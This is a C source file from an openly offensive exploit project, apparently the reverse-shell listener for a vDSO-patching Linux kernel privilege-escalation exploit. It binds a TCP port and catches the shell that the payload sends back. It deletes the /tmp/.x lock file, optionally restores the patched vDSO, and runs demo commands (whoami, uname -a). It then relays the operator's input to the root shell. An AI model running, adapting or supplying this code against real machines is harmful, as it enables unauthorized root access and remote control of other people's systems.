/*
Copyright (c) 2017, scumjr

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Copyright (c) 2017 Intel Corporation

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
#define _GNU_SOURCE
#include <err.h>
#include <poll.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>

/* STAGE lets us keep track of whether we are trying to patch the vDSO to be
 * the payload or restore to the original vDSO. */
enum STAGE {
  PATCH,
  RESTORE
};

/* Function from proc_exploit.c */
void exploit(enum STAGE stage);

/*
 * parse_ip_port parses a string containing an ip and port such as
 * 127.0.0.1:1234 into the uint32_t ip and uint16_t port.
 */
int parse_ip_port(char *str, uint32_t *ip, uint16_t *port)
{
  char *p;
  int ret;

  str = strdup(str);
  if (str == NULL) {
    warn("strdup");
    return -1;
  }

  p = strchr(str, ':');
  if (p != NULL && p[1] != '\x00') {
    *p = '\x00';
    *port = htons(atoi(p + 1));
  }

  ret = (inet_aton(str, (struct in_addr *)ip) == 1) ? 0 : -1;
  if (ret == -1) {
    warn("inet_aton(%s)", str);
  }

  free(str);
  return ret;
}

/* writeall makes sure that the number of bytes passed to write get written. It
 * wraps write to check if the number of bytes returned are the number of bytes
 * we wanted to write and makes sure that all of them get written. */
int writeall(int fd, const void *buf, size_t count)
{
  const char *p;
  ssize_t i;

  p = buf;
  do {
    i = write(fd, p, count);
    if (i == 0) {
      return -1;
    } else if (i == -1) {
      if (errno == EINTR)
        continue;
      return -1;
    }
    count -= i;
    p += i;
  } while (count > 0);

  return 0;
}

/* start_server creates a tcp socket listening on port which will be used to
 * catch the reverse shell */
int start_server(uint16_t port) {
  int enable, s;
  struct sockaddr_in addr;

  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == -1) {
    warn("socket");
    return -1;
  }

  enable = 1;
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) == -1) {
    warn("setsockopt(SO_REUSEADDR)");
  }

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INADDR_ANY;
  addr.sin_port = port;

  if (bind(s, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
    warn("failed to bind socket on port %d", ntohs(port));
    close(s);
    return -1;
  }

  if (listen(s, 1) == -1) {
    warn("listen");
    close(s);
    return -1;
  }

  return s;
}

/* catch_shell accepts the connection from the payload using the server socket
 * created in start_server. It then manages the input output piping this
 * processes stdin to the shell and the shells stdout to this processes stdout.
 * When it first catches the shell it removes the lock file, /tmp/.x, shuts
 * down the server and restores the vDSO to its unpatched form. */
int catch_shell(int s, int demo) {
  struct sockaddr_in addr;
  struct pollfd fds[2];
  socklen_t addr_len;
  char buf[4096];
  nfds_t nfds;
  int c, n;

  fprintf(stderr, "[*] Waiting for reverse connect shell...\n");

  addr_len = sizeof(addr);
  while (1) {
    c = accept(s, (struct sockaddr *)&addr,  &addr_len);
    fprintf(stderr, "[*] Caught reverse shell\n");
    if (c == -1) {
      if (errno == EINTR)
        continue;
      warn("accept");
      return -1;
    }
    break;
  }

  close(s);

#ifdef RESTORE_VDSO
  if (fork() == 0) {
    fprintf(stderr, "[*] Restoring vDSO...\n");
    exploit(RESTORE);
    exit(0);
  }
  fprintf(stderr, "[*] Waiting for restore...\n");
  wait(NULL);
  fprintf(stderr, "[*] Restore complete\n");
#endif

  fprintf(stderr, "[*] Removing /tmp/.x\n");
  /* Remove /tmp/.x so we can re-run and get another shell */
  strncpy(buf, "rm -vf /tmp/.x\n", sizeof(buf));
  n = strnlen(buf, sizeof(buf));
  writeall(c, buf, n);
  n = read(c, buf, sizeof(buf));
  if (n != 0) {
    writeall(STDOUT_FILENO, buf, n);
  }

  fprintf(stderr, "[*] Enjoy your shell!\n# ");

  if (demo == 1) {
    strncpy(buf, "ls -lAF /home/\n", sizeof(buf));
    n = strnlen(buf, sizeof(buf));
    writeall(STDOUT_FILENO, buf, n);
    writeall(c, buf, n);
    n = read(c, buf, sizeof(buf));
    if (n != 0) {
      writeall(STDOUT_FILENO, buf, n);
    }
    strncpy(buf, "whoami\n", sizeof(buf));
    n = strnlen(buf, sizeof(buf));
    writeall(STDOUT_FILENO, buf, n);
    writeall(c, buf, n);
    n = read(c, buf, sizeof(buf));
    if (n != 0) {
      writeall(STDOUT_FILENO, buf, n);
    }
    strncpy(buf, "uname -a\n", sizeof(buf));
    n = strnlen(buf, sizeof(buf));
    writeall(STDOUT_FILENO, buf, n);
    writeall(c, buf, n);
    n = read(c, buf, sizeof(buf));
    if (n != 0) {
      writeall(STDOUT_FILENO, buf, n);
    }

    close(c);

    return 0;
  }

  fds[0].fd = STDIN_FILENO;
  fds[0].events = POLLIN;

  fds[1].fd = c;
  fds[1].events = POLLIN;

  nfds = 2;
  while (nfds > 0) {
    if (poll(fds, nfds, -1) == -1) {
      if (errno == EINTR)
        continue;
      warn("poll");
      break;
    }

    if (fds[0].revents == POLLIN) {
      n = read(STDIN_FILENO, buf, sizeof(buf));
      if (n == -1) {
        if (errno != EINTR) {
          warn("read(STDIN_FILENO)");
          break;
        }
      } else if (n == 0) {
        break;
      } else {
        writeall(c, buf, n);
      }
    }

    if (fds[1].revents == POLLIN) {
      n = read(c, buf, sizeof(buf));
      if (n == -1) {
        if (errno != EINTR) {
          warn("read(c)");
          break;
        }
      } else if (n == 0) {
        break;
      } else {
        writeall(STDOUT_FILENO, buf, n);
      }
    }
  }

  return 0;
}
